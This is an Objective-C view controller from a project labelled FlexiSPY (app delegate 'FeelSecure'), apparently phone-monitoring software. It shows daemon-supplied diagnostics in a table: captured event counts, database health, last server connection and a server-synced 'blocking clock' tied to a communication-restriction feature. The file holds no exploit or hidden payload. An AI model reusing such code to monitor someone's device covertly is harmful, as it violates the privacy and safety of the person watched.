//
//  Diagnostics.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "Diagnostics.h"
#import "DiagnosticCell.h"
#import "Utils.h"
#import "FeelSecureAppDelegate.h"

#import "ConfigurationManager.h"
#import "AppEngineUICmd.h"
#import "DbHealthInfo.h"
#import "EventCount.h"
#import "SyncTime.h"
#import "DateTimeFormat.h"

@implementation Diagnostics

@synthesize mTableView, mDiagnosticItems;

/*
 // The designated initializer.  Override if you create the controller programmatically and want to perform customization that is not appropriate for viewDidLoad.
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    if (self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil]) {
        // Custom initialization
    }
    return self;
}
*/


// Implement viewDidLoad to do additional setup after loading the view, typically from a nib.
- (void)viewDidLoad {
    [super viewDidLoad];
//	mDiagnosticItems = [Utils getDiagnostics];
//	[mDiagnosticItems retain];
	[mTableView setDelegate:self];
	[mTableView setDataSource:self];
	
	FeelSecureAppDelegate *appDelegate = (FeelSecureAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] addCommandDelegate:self];
	[[appDelegate mAppUIConnection] processCommand:kAppUI2EngineGetDiagnosticCmd withCmdData:nil];
}


/*
// Override to allow orientations other than the default portrait orientation.
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    // Return YES for supported orientations
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}
*/

- (void)didReceiveMemoryWarning {
	// Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];
	
	// Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
	// Release any retained subviews of the main view.
	// e.g. self.myOutlet = nil;

}


- (void)dealloc {
	[mTableView release];
	[mDiagnosticItems release];
    [super dealloc];
}

#pragma mark Table view methods

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
	return [mDiagnosticItems count];
    
}


// Customize the number of rows in the table view.
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return 1;
	
}

// Customize the appearance of table view cells.
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    
    static NSString *CellIdentifier = @"Cell";
	
    UITableViewCell *cell = (UITableViewCell*) [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {		
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
	}
	DiagnosticObject*  row = [mDiagnosticItems objectAtIndex:[indexPath section]];
	
	//[cell setValues: row.mName: row.mValue];
	cell.textLabel.text = row.mValue;
	
    return cell;
}

- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
	DiagnosticObject*  row = [mDiagnosticItems objectAtIndex:section];
	return row.mName;
}

- (void)viewWillAppear:(BOOL)animated {
	NSLog(@"view appeared");
	[super viewWillAppear:animated];
	[self.view setHidden:NO];
}

- (void)viewWillDisappear:(BOOL)animated {
	[super viewWillDisappear:animated];
	DLog(@"----->Enter<-----")
	FeelSecureAppDelegate *appDelegate = (FeelSecureAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] removeCommandDelegate:self];
}

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    return 50; //[indexPath row]; // your dynamic height...
}

// Override to support row selection in the table view.
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
	
    // Navigation logic may go here -- for example, create and push another view controller.
	// AnotherViewController *anotherViewController = [[AnotherViewController alloc] initWithNibName:@"AnotherView" bundle:nil];
	// [self.navigationController pushViewController:anotherViewController animated:YES];
	// [anotherViewController release];
	
}



/*
 // Override to support conditional editing of the table view.
 - (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath {
 // Return NO if you do not want the specified item to be editable.
 return YES;
 }
 */


/*
 // Override to support editing the table view.
 - (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath {
 
 if (editingStyle == UITableViewCellEditingStyleDelete) {
 // Delete the row from the data source.
 [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
 }   
 else if (editingStyle == UITableViewCellEditingStyleInsert) {
 // Create a new instance of the appropriate class, insert it into the array, and add a new row to the table view.
 }   
 }
 */


/*
 // Override to support rearranging the table view.
 - (void)tableView:(UITableView *)tableView moveRowAtIndexPath:(NSIndexPath *)fromIndexPath toIndexPath:(NSIndexPath *)toIndexPath {
 }
 */


/*
 // Override to support conditional rearranging of the table view.
 - (BOOL)tableView:(UITableView *)tableView canMoveRowAtIndexPath:(NSIndexPath *)indexPath {
 // Return NO if you do not want the item to be re-orderable.
 return YES;
 }
 */

- (void) commandCompleted: (id) aCmdResponse toCommand: (NSInteger) aCmd {
	if (aCmd == kAppUI2EngineGetDiagnosticCmd) {
		NSInteger location = 0;
		NSInteger length = 0;
		NSData *data = aCmdResponse;
		//DLog(@"Data totally get from daemon: %@", data)
		[data getBytes:&length length:sizeof(NSInteger)];
		location += sizeof(NSInteger);
		//DLog(@"Event count object's length: %d", length)
		EventCount *eventCount = [[EventCount alloc] initWithData:[data subdataWithRange:NSMakeRange(location, length)]];
		location += length;
		[data getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
		location += sizeof(NSInteger);
		//DLog(@"Database health object's length: %d", length)
		DbHealthInfo *dbHealthInfo = [[DbHealthInfo alloc] initWithData:[data subdataWithRange:NSMakeRange(location, length)]];
		location += length;
		[data getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
		location += sizeof(NSInteger);
		//DLog(@"Last connection string object's length: %d", length)
		NSString *lastConnectionTime = [[NSString alloc] initWithData:[data subdataWithRange:NSMakeRange(location, length)] encoding:NSUTF8StringEncoding];
		location += length;
		[mDiagnosticItems release];
		mDiagnosticItems = nil;
		mDiagnosticItems = [Utils getDiagnosticsWithDBHealthInfo:dbHealthInfo withEventCount:eventCount andLastConnectionTime:lastConnectionTime];
		
		// Synced server time
		FeelSecureAppDelegate *appDelegate = (FeelSecureAppDelegate *)[[UIApplication sharedApplication] delegate];
		id <ConfigurationManager> configurationManager = [appDelegate mConfigurationManager];
		if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
			[data getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			NSData *syncTimeData = [data subdataWithRange:NSMakeRange(location, length)];
			if ([syncTimeData length]) {
				NSInteger loc = 0;
				BOOL isTimeSynced = NO;
				[syncTimeData getBytes:&isTimeSynced length:sizeof(BOOL)];
				loc += sizeof(BOOL);
				if (isTimeSynced) {
					// X difference in time unit
					NSTimeInterval xDiff = 0.00;
					[syncTimeData getBytes:&xDiff range:NSMakeRange(loc, sizeof(NSTimeInterval))];
					loc += sizeof(NSTimeInterval);
					//DLog (@"X different time interval between client and server = %f", xDiff);
					
					// Server sync time object
					[syncTimeData getBytes:&length range:NSMakeRange(loc, sizeof(NSInteger))];
					loc += sizeof(NSInteger);
					NSData *subData = [syncTimeData subdataWithRange:NSMakeRange(loc, length)];
					SyncTime *syncTime = [[SyncTime alloc] initWithData:subData];
					
					NSDate *now = [NSDate date];
					NSDate *syncDateNow = [now dateByAddingTimeInterval:xDiff];
					
					NSDateFormatter *formatDate = [[[NSDateFormatter alloc] initWithSafeLocaleAndSymbol] autorelease];
					
					/*
					//CASE 1: +0700 --> equal to -0700 (GMT+07:00)
					//CASE 2: -0700 --> equal to -0700 (GMT-07:00)
					//CASE 3: +0022 --> equal to +0022 (GMT+00:22)
					//CASE 5: -1200 --> equal to -1200 (GMT-12:00)
					//CASE 6: -0030 --> equal to -0030 (GMT-00:30)
					//CASE 7: +0660 --> equal to +0700 (GMT+07:00)
					//CASE 8: -0660 --> equal to -0700 (GMT-07:00)
					//[serverSyncTime setMTimeZone:@"+0700"];
					
					//--- Server sync result
					NSTimeZone * syncTimeZone = nil;
					if ([syncTime mTimeZoneRep] == kRepTimeZoneTimeSpan) { // [+/-]0000
						NSString *hourGmt = [[syncTime mTimeZone] substringWithRange:NSMakeRange(1, 2)]; // ===> 00
						NSString *minGmt = [[syncTime mTimeZone] substringWithRange:NSMakeRange(3, 2)]; // ===> 00
						//DLog (@"hourGmt = %@, minGmt = %@", hourGmt, minGmt);
						NSNumberFormatter *numberFmt = [[[NSNumberFormatter alloc] init] autorelease];
						NSNumber *hour = [numberFmt numberFromString:hourGmt];
						NSNumber *min = [numberFmt numberFromString:minGmt];
						//DLog (@"hour = %@, min = %@, hour.int = %d, min.int = %d", hour, min, [hour intValue], [min intValue]);
						NSInteger gmtOffset = 3600 * [hour intValue] + 60 * [min intValue];
						if ([[syncTime mTimeZone] hasPrefix:@"-"]) {
							gmtOffset = -gmtOffset;
						}
						//DLog (@"GMT offset from time span = %d", gmtOffset);
						syncTimeZone = [NSTimeZone timeZoneForSecondsFromGMT:gmtOffset];
					} else { // Asia/Kolkata
						syncTimeZone = [NSTimeZone timeZoneWithName:[syncTime mTimeZone]];
					}
					//DLog(@"Server time zone = %@, name = %@", serverTimeZone, [serverTimeZone name]);
					
					[formatDate setTimeZone:syncTimeZone];
					[formatDate setDateFormat:@"yyyy-MM-dd HH:mm:ss zzzz"];
					NSString *getTimeResult = [formatDate stringFromDate:syncDateNow];
					
					DiagnosticObject *dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kGetTimeResult", @"")
																		   andValue:[NSString stringWithFormat:@"%@", getTimeResult]];
					[mDiagnosticItems insertObject:dobj atIndex:0];
					[dobj release];
					*/
					
					// Blocking clock
					[formatDate setTimeZone:[NSTimeZone localTimeZone]];
					[formatDate setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
					NSString *blockingClock = [formatDate stringFromDate:syncDateNow];
					
					DiagnosticObject *dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kBlockingClock", @"")
																		   andValue:[NSString stringWithFormat:@"%@", blockingClock]];
					[mDiagnosticItems insertObject:dobj atIndex:0];
					[dobj release];
					
					[syncTime release];
				} else {
					NSString *blockingClock = NSLocalizedString(@"kServerSyncTimeNotSynced", @"");
					DiagnosticObject *dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kBlockingClock", @"")
																		   andValue:[NSString stringWithFormat:@"%@", blockingClock]];
					[mDiagnosticItems insertObject:dobj atIndex:0];
					[dobj release];
				}
			}
		}
		
		[mDiagnosticItems retain];
		[lastConnectionTime release];
		[dbHealthInfo release];
		[eventCount release];
		[mTableView reloadData];
	}
}

@end
